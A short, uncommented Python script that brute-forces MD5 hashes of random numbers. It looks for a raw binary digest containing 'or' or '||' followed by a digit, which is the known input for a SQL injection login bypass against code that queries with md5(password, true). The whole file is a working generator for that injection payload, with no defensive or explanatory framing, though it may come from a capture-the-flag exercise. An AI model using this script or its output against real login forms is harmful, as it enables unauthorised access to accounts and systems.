import hashlib
import re
import random

def main():
	
  count = 0
  rang = 2147483647**2 
  found = False

  while not found:
    count += 1
    if count % 100000 == 0:
      print(count) 
    num = random.randrange(0, rang)
    print(num)
    for i in range(num, num+1000000):
      s = str(i)
      m = hashlib.md5()
      m.update(str.encode(s))
      dig = m.digest()
      idx = dig.lower().find(b"'or'")
      if idx < 0:
        idx = dig.lower().find(b"'||'")
      if idx >= 0 and idx+4 < len(dig) and dig[idx+4] >= ord('0') and dig[idx+4] <= ord('9'):
        found = True
        print("matched at attempt ", count)
        print(s)
        print(dig)
   
main()
